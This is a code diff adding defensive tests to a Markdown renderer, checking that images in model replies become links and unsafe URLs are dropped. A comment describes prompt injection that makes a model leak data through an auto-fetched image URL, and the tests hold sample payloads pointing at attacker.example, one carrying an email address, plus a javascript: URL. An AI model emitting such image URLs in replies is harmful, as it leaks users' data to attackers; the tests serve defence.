@@ -156,6 +156,98 @@ test("GFM extras the plugin enables render as elements, not literal syntax", asy
   );
 });
 
+// A prompt injection in a note, calendar event or web result can make the model
+// end its reply with an image whose URL carries what it read. An <img> fetches
+// that URL the moment the reply renders, with no click.
+test("a Markdown image never renders an <img>; it becomes a link the user can click", async (t) => {
+  const html = await renderMarkdown(
+    t,
+    [
+      "![](https://attacker.example/p.png?d=alice%40corp.com)",
+      "![Quarterly chart](https://attacker.example/chart.png)",
+      "![   ](https://attacker.example/blank.png)",
+      '![titled](https://attacker.example/titled.png "Chart title")',
+      "![upper](HTTPS://attacker.example/upper.png)",
+      "![plain](http://attacker.example/plain.png)",
+      "![reference][pixel]",
+      "[![badge](https://attacker.example/badge.svg)](https://github.com/openwhispr)",
+      "[![](https://attacker.example/blank-badge.svg)](https://github.com/openwhispr/blank)",
+      "",
+      "[pixel]: https://attacker.example/ref.png",
+      "",
+    ].join("\n")
+  );
+
+  assert.ok(!html.includes("<img"), "no image element is produced");
+  const attributesWithUrl = [...html.matchAll(/([\w-]+)="[^"]*attacker\.example[^"]*"/g)].map(
+    ([, name]) => name
+  );
+  assert.ok(attributesWithUrl.length > 0);
+  assert.ok(
+    attributesWithUrl.every((name) => name === "href"),
+    `the image URL only appears as a link target, got: ${attributesWithUrl.join(", ")}`
+  );
+  const links = [...html.matchAll(/<a\b([^>]*)>([^<]*)<\/a>/g)].map(([, attrs, label]) => ({
+    href: attrs.match(/href="([^"]*)"/)?.[1],
+    attrs,
+    label,
+  }));
+  assert.deepEqual(
+    links.map(({ href, label }) => [href, label]),
+    [
+      [
+        "https://attacker.example/p.png?d=alice%40corp.com",
+        "https://attacker.example/p.png?d=alice%40corp.com",
+      ],
+      ["https://attacker.example/chart.png", "Quarterly chart"],
+      ["https://attacker.example/blank.png", "https://attacker.example/blank.png"],
+      ["https://attacker.example/titled.png", "titled"],
+      ["HTTPS://attacker.example/upper.png", "upper"],
+      ["http://attacker.example/plain.png", "plain"],
+      ["https://attacker.example/ref.png", "reference"],
+      // A nested link would take the click, so the surrounding link keeps it.
+      ["https://github.com/openwhispr", "badge"],
+      // The image URL would read as the destination of a link that goes elsewhere.
+      ["https://github.com/openwhispr/blank", ""],
+    ],
+    "each image is a link labelled with its alt text, or its URL when the alt text is blank"
+  );
+  assert.ok(
+    links.find(({ label }) => label === "titled").attrs.includes('title="Chart title"'),
+    "the image title carries over"
+  );
+  for (const { attrs } of links) {
+    assert.ok(attrs.includes('target="_blank"'), "opens like other Markdown links");
+    assert.ok(attrs.includes('rel="noopener noreferrer"'));
+  }
+});
+
+test("an image without an absolute web URL keeps only its alt text", async (t) => {
+  const html = await renderMarkdown(
+    t,
+    [
+      "![inline chart](data:image/png;base64,iVBORw0KGgo=)",
+      "![](javascript:alert(1))",
+      "![share](//attacker.example/unc.png?next=https://attacker.example/)",
+      "![drive](/C:/Windows/System32/cmd.exe)",
+      "![anchor](#section)",
+      "![](//attacker.example/blank-share.png)",
+      "![](/C:/Windows/System32/blank.exe)",
+      "",
+    ].join("\n")
+  );
+
+  assert.ok(!html.includes("<img"), "no image element is produced");
+  assert.ok(!html.includes("<a"), "nothing to link to");
+  for (const alt of ["inline chart", "share", "drive", "anchor"]) {
+    assert.ok(html.includes(alt), `the alt text "${alt}" still reads`);
+  }
+  assert.ok(!html.includes("data:"), "the data: URL is not echoed");
+  assert.ok(!html.includes("javascript:"), "the javascript: URL is not echoed");
+  assert.ok(!html.includes("attacker.example"), "the relative URL is not echoed");
+  assert.ok(!html.includes("System32"), "the drive path is not echoed");
+});
+
 test("URL sanitisation is unchanged with the plugin enabled", async (t) => {
   const html = await renderMarkdown(
     t,
